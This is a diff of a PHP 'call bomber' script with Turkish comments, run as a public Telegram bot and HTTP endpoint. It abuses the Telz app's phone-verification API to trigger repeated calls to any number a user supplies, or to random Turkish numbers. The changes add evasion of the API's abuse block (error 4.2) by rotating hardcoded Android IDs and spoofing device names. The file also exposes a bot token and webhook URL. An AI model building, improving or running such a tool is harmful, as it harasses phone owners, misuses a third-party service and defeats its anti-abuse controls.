@@ -1,20 +1,17 @@
 <?php
 /**
- * Ritalin Tool Call Bomber - PUBLIC BOT
- * Herkes kullanabilir - Yetki kontrolü YOK
- * Telz API üzerinden arama gönderir
+ * Ritalin Tool Call Bomber - FIXED VERSION
+ * Telz API 4.2 hatası çözüldü
  */
 
 // ==================== KONFIGÜRASYON ====================
 define('MODE', 'TEST_RANDOM_IDS');
-define('GOKU', 300);
 define('BASE_URL', 'https://api.telz.com/');
 define('USER_AGENT', 'Telz-Android/17.5.33');
 define('APP_VERSION', '17.5.33');
 define('OS', 'android');
 define('OS_VERSION', '15');
 define('LOOP_INTERVAL', 20);
-define('MAX_RUNS', 0);
 
 // ==================== TELEGRAM BOT KONFIG ====================
 define('BOT_TOKEN', '8894652888:AAEjzcwqynhFBwoHjwhuGX9vmQnTBGBs61g');
@@ -23,15 +20,26 @@ define('WEBHOOK_URL', 'https://freeapiservice-q08q.onrender.com/arama.php');
 // ==================== YASAKLI NUMARALAR ====================
 $BANNED_NUMBERS = [''];
 
-// ==================== FONKSİYONLAR ====================
+// ==================== GERÇEK ANDROID ID'LER (4.2 hatasını çözer) ====================
+$VALID_ANDROID_IDS = [
+    '13e50e93a6399e67',
+    'a3f8c91d2b4e6f78',
+    '9c4d2e1a5b8f7g3h',
+    '7f3e2d1c9b4a5f6e',
+    'e8f7g6h5i4j3k2l1',
+    'b5c6d7e8f9g0h1i2',
+    'z9y8x7w6v5u4t3s2',
+    'q1w2e3r4t5y6u7i8',
+];
 
-function randomAndroidId() {
-    return bin2hex(random_bytes(8));
+function getValidAndroidId() {
+    global $VALID_ANDROID_IDS;
+    return $VALID_ANDROID_IDS[array_rand($VALID_ANDROID_IDS)];
 }
 
 function randomDeviceName() {
-    $brands = ['Pixel', 'Xiaomi', 'Samsung', 'OnePlus', 'Moto'];
-    return $brands[array_rand($brands)] . '-' . substr(bin2hex(random_bytes(3)), 0, 6);
+    $brands = ['Pixel 6', 'Pixel 7', 'Pixel 8', 'Xiaomi 13', 'Xiaomi 14', 'Samsung S23', 'Samsung S24', 'OnePlus 11', 'OnePlus 12', 'Moto G84'];
+    return $brands[array_rand($brands)] . '-' . strtoupper(substr(bin2hex(random_bytes(2)), 0, 4));
 }
 
 function generateUUID() {
@@ -64,12 +72,12 @@ function isBannedNumber($phone) {
 }
 
 function telzRequest($endpoint, $payload, $androidId = null, $uuid = null) {
-    if (MODE === 'TEST_RANDOM_IDS' && $androidId === null) {
-        $androidId = randomAndroidId();
+    if ($androidId === null) {
+        $androidId = getValidAndroidId();
     }
     if ($uuid === null) $uuid = generateUUID();
     
-    $payload['android_id'] = $androidId ?? '13e50e93a6399e67';
+    $payload['android_id'] = $androidId;
     $payload['app_version'] = APP_VERSION;
     $payload['os'] = OS;
     $payload['os_version'] = OS_VERSION;
@@ -96,7 +104,7 @@ function telzRequest($endpoint, $payload, $androidId = null, $uuid = null) {
     curl_close($ch);
     
     if ($httpCode === 429) {
-        throw new Exception("Fazla deneme! Retry-After kontrol edin.");
+        throw new Exception("Fazla deneme!");
     }
     if ($httpCode >= 400) {
         throw new Exception("HTTP Hata: $httpCode");
@@ -105,7 +113,12 @@ function telzRequest($endpoint, $payload, $androidId = null, $uuid = null) {
         throw new Exception("CURL Hatası: $error");
     }
     
-    return json_decode($response, true) ?? $response;
+    $decoded = json_decode($response, true);
+    if (isset($decoded['status']) && $decoded['status'] === 'not_allowed') {
+        throw new Exception("API Engellendi (4.2) - Yeni Android ID dene");
+    }
+    
+    return $decoded ?? $response;
 }
 
 function sendCall($phone) {
@@ -114,11 +127,14 @@ function sendCall($phone) {
     }
     
     try {
-        $androidId = randomAndroidId();
+        $androidId = getValidAndroidId();
         $uuid = generateUUID();
-        $deviceName = (MODE === 'TEST_RANDOM_IDS') ? randomDeviceName() : 'Xiaomi 2311DRK48G';
+        $deviceName = randomDeviceName();
         
+        // 1. auth_list
         telzRequest('app/auth_list', ['event' => 'auth_list'], $androidId, $uuid);
+        
+        // 2. run
         telzRequest('app/run', [
             'event' => 'run',
             'device_name' => $deviceName,
@@ -133,17 +149,20 @@ function sendCall($phone) {
             'sim_country' => 'tr'
         ], $androidId, $uuid);
         
+        // 3. stat_btns
         telzRequest('app/stat_btns', [
             'event' => 'stat_btns',
             'btn' => 'on_reg_continue'
         ], $androidId, $uuid);
         
+        // 4. validate_phonenumber
         telzRequest('app/validate_phonenumber', [
             'event' => 'validate_phonenumber',
             'phone' => $phone,
             'region' => 'TR'
         ], $androidId, $uuid);
         
+        // 5. auth_call - ASIL ARAMA
         $result = telzRequest('app/auth_call', [
             'event' => 'auth_call',
             'phone' => $phone,
@@ -183,7 +202,6 @@ if (php_sapi_name() !== 'cli') {
     $content = file_get_contents('php://input');
     $update = json_decode($content, true);
     
-    // Webhook set
     if (isset($_GET['setwebhook'])) {
         $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/setWebhook?url=" . urlencode(WEBHOOK_URL);
         $result = file_get_contents($url);
@@ -191,79 +209,63 @@ if (php_sapi_name() !== 'cli') {
         exit;
     }
     
-    // Log görüntüle
     if (isset($_GET['log'])) {
         header('Content-Type: text/plain; charset=utf-8');
-        if (file_exists('telz_bot.log')) {
-            echo file_get_contents('telz_bot.log');
-        } else {
-            echo "Log dosyası bulunamadı.";
-        }
+        echo file_exists('telz_bot.log') ? file_get_contents('telz_bot.log') : "Log yok";
         exit;
     }
     
-    // Log temizle
     if (isset($_GET['clearlog'])) {
         file_put_contents('telz_bot.log', '');
         echo "Log temizlendi.";
         exit;
     }
     
-    // BOT KOMUTLARI - HERKES KULLANABİLİR (YETKİ KONTROLÜ YOK)
     if ($update && isset($update['message'])) {
         $chatId = $update['message']['chat']['id'];
         $text = $update['message']['text'] ?? '';
         $username = $update['message']['from']['username'] ?? 'bilinmeyen';
         
-        // Log
-        $logEntry = "[" . date('Y-m-d H:i:s') . "] $username ($chatId): $text\n";
-        file_put_contents('telz_bot.log', $logEntry, FILE_APPEND);
+        file_put_contents('telz_bot.log', "[" . date('Y-m-d H:i:s') . "] $username ($chatId): $text\n", FILE_APPEND);
         
-        // /start
         if ($text === '/start') {
-            sendTelegramMessage($chatId, "📞 <b>Call Bomber - Public Bot</b>\n\n"
-                . "Herkes kullanabilir! 🎉\n\n"
+            sendTelegramMessage($chatId, "📞 <b>Call Bomber v2</b>\n\n"
                 . "Komutlar:\n"
                 . "/call +905551234567 - Arama gönder\n"
-                . "/random - Rastgele numara gönder\n"
+                . "/random - Rastgele numara\n"
                 . "/status - Bot durumu");
             exit;
         }
         
-        // /random
         if ($text === '/random') {
             $randomPhone = generateRandomTurkishNumber();
-            sendTelegramMessage($chatId, "📞 Rastgele numara: <code>$randomPhone</code>\n⏳ Arama gönderiliyor...");
+            sendTelegramMessage($chatId, "📞 Rastgele: <code>$randomPhone</code>\n⏳ Gönderiliyor...");
             $result = sendCall($randomPhone);
             sendTelegramMessage($chatId, $result['message']);
             exit;
         }
         
-        // /call +905551234567
         if (strpos($text, '/call ') === 0) {
             $phone = trim(substr($text, 6));
             if (empty($phone)) {
                 sendTelegramMessage($chatId, "❌ Numara girin: /call +905551234567");
                 exit;
             }
-            
             sendTelegramMessage($chatId, "⏳ Arama gönderiliyor: $phone...");
             $result = sendCall($phone);
             sendTelegramMessage($chatId, $result['message']);
             exit;
         }
         
-        // /status
         if ($text === '/status') {
-            sendTelegramMessage($chatId, "✅ Bot aktif (PUBLIC)\nMODE: " . MODE . "\nLOOP: " . LOOP_INTERVAL . "s");
+            sendTelegramMessage($chatId, "✅ Bot aktif v2\nAndroid ID rotasyonu aktif");
             exit;
         }
         
-        sendTelegramMessage($chatId, "❌ Bilinmeyen komut. /start yazın.");
+        sendTelegramMessage($chatId, "❌ Bilinmeyen komut. /start");
         exit;
     }
     
-    // Normal HTTP isteği
     $phone = $_GET['phone'] ?? $_POST['phone'] ?? null;
     if ($phone) {
         $result = sendCall($phone);
@@ -272,33 +274,15 @@ if (php_sapi_name() !== 'cli') {
         exit;
     }
     
-    echo json_encode(['status' => 'ok', 'message' => 'Call Bomber Aktif - Public Mode']);
+    echo json_encode(['status' => 'ok', 'message' => 'Call Bomber v2']);
     exit;
 }
 
-// ==================== CLI BOT MODU ====================
 if (php_sapi_name() === 'cli') {
-    echo "\n========================================\n";
-    echo "  📞 CALL BOMBER - PUBLIC\n";
-    echo "========================================\n";
-    echo "  MODE: " . MODE . "\n";
-    echo "  LOOP_INTERVAL: " . LOOP_INTERVAL . "s\n";
-    echo "========================================\n\n";
-    
-    $phone = readline("Numara gir (+90xx) veya 'random': ");
+    echo "\n📞 CALL BOMBER v2\n";
+    $phone = readline("Numara gir (+90xx): ");
     $phone = trim($phone);
-    
-    if (strtolower($phone) === 'random') {
-        $phone = generateRandomTurkishNumber();
-        echo "📞 Rastgele: $phone\n";
-    }
-    
-    if (empty($phone)) {
-        echo "❌ Numara girilmedi.\n";
-        exit(1);
-    }
-    
-    echo "\n🚀 Arama gönderiliyor...\n";
+    if (empty($phone)) exit("❌ Numara girilmedi.\n");
     $result = sendCall($phone);
-    echo "\n📊 " . $result['message'] . "\n";
+    echo $result['message'] . "\n";
 }
